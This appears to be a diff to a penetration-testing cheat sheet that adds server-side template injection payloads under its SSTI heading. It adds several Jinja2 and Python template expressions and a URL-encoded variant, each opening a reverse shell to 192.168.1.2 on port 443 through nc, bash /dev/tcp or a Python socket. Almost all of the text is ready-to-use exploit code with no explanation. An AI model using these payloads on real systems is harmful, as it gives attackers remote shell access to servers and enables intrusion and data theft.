@@ -241,12 +241,25 @@
   ---
    
   # <kbd>Server Side Template Injection</kbd>
-   
+  
+  ```
+  {{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/sh 192.168.1.2 443').read()}}
+  ``` 
+  ```cmd
+  {{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'",shell=True,stdout=-1).communicate()[0].strip()}}
+  ``` 
   ```cmd
   {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.2\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
   ```
+  ```cmd
+  {% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"')}}
+  ```
+  ```
+  %7B%25%20import%20os%20%25%7D%7B%7Bos.system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22%27%29%7D%7D
+  ```
    
-  --- 
+  ---
+  
   # <kbd>UnrealIRCd</kbd>
  
   ```cmd
